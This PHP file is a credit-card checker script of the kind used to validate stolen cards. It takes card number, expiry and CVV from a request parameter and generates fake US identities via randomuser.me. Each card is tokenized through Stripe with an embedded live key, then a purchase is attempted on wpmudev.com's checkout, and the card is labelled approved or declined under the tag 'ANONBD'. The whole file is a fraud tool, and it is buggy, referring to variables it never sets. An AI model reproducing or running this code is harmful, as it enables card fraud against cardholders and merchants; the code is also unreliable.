<?php
#==================[SETUP]
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#==============[Randomizing Details Api]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$add = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
#=====================[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e59ba6de-cb48-4fd6-8702-de7f9b9dbd19de173f&muid=e172c97f-f80d-4438-8898-558da2a7ebff069436&sid=9f3dbff3-a1ea-402c-94c4-9a218d5155e85c4263&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=46722&key=pk_live_tyioedKnjQd314YfV0C5ane7');


$result1 = curl_exec($ch);
$tk = trim(strip_tags(getStr($result1,'"id": "','"')));

#==================[2 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://wpmudev.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: wpmudev.com';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'accept: */*';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://wpmudev.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://wpmudev.com/checkout/';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wpmudev_stripe_checkout&_wpnonce=e749763f87&_session=23cb1a3ec0&coupon=&project_id=&product=full-1-site&period=12&plan=&quantity=1&plan_url=product%3Dfull-1-site%26period%3D12%26quantity%3D1&skip_trial=0&group=&stripe_payment_method='.$tk.'&intent_id=&intent_secret=&name='.$name.'+'.$last.'');
$result2 = curl_exec($ch);

#===============[Card Response]
if (strpos($result33, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-pill badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-pill badge-success">✓</span> <span class="badge badge-pill badge-success"> ★★★ CVV MATCHED ♛ANONBD </span></br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★★ CVV MATCHED ♛ANONBD </span></br>';
}
elseif(strpos($result3, "checkout_success" )) {
  echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ CVC MATCHED ★ANONBD</span></br>';
}
if(strpos($result3, "Your card's security code is incorrect")) {

  echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . ' </span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ CCN MATCHED ♛ANONBD </span></br>'; 

}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ CVC MATCHED - Incorrect Zip♛ANONBD </span></br>';
}
elseif(strpos($result3, 'There was a problem with your credit card information: Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">Aprovadas</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-pill badge-success"> ★ Insufficient Funds♛ANONBD </span></br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Card Expired ♛ANONBD</span> </br>';
}
elseif (strpos($result3, "pickup_card")) {
  echo '<span class="badge badge-danger">Aprovadas</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-pill badge-danger"> ★ Pickup Card_Card - Sometime Useable ♛ ANONBD</span></br>';
}
elseif(strpos($result3, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-dark">Reprovadas</span> <span class="badge badge-dark">✕</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-dark">✕</span> <span class="badge badge-pill badge-dark"> ★ Incorrect Card Number ♛ANONBD</span> </br>';
}
 elseif (strpos($result3, "incorrect_number")) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Incorrect Card Number♛ANONBD</span> </br>';
}
elseif(strpos($result3, 'There was a problem with your credit card information: Your card was declined.')) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Card Declined  ♛ANONBD</span> </br>';
}
elseif (strpos($result3, "generic_decline")) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Declined : Generic_Decline ♛ANONBD</span> </br>';
}
elseif (strpos($result3, "do_not_honor")) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Declined : Do_Not_Honor  ♛ANONBD</span> </br>';
}
elseif (strpos($result3, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ Security Code Check : Unchecked [Proxy Dead]  ♛ANONBD</span> </br>';
}
elseif (strpos($result3, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-info">Reprovadas</span> <span class="badge badge-pill badge-warning">✕</span> <span class="badge badge-pill badge-info">' . $lista . '</span> <span class="badge badge-pill badge-info">✕</span> <span class="badge badge-pill badge-info"> ★ Security Code Check : Fail ♛ANONBD</span> </br>';
}
elseif (strpos($result3, "expired_card")) {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-pill badge-danger">✕</span> <span class="badge badge-pill badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-secondary"> ★ Expired Card ♛ANONBD</span> </br>';
}
elseif (strpos($result3,'There was a problem with your credit card information: Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-warning">Reprovadas</span> <span class="badge badge-pill badge-warning">✕</span> <span class="badge badge-warning">' . $lista . '</span> <span class="badge badge-pill badge-warning">✕</span> <span class="badge badge-pill badge-warning"> ★ Card Doesnt Support This Purchase ♛ANONBD</span> </br>';
}

else {
  echo '<span class="badge badge-danger">Reprovadas</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . ' </span> <span class="badge badge-danger">✕</span> <span class="badge badge-pill badge-danger"> ★ '.$msg.' ♛ANONBD</span> </br>';
}

curl_close($ch);
ob_flush();
echo "<b>2REQ Result:</b> $result2<br><br>";
?>
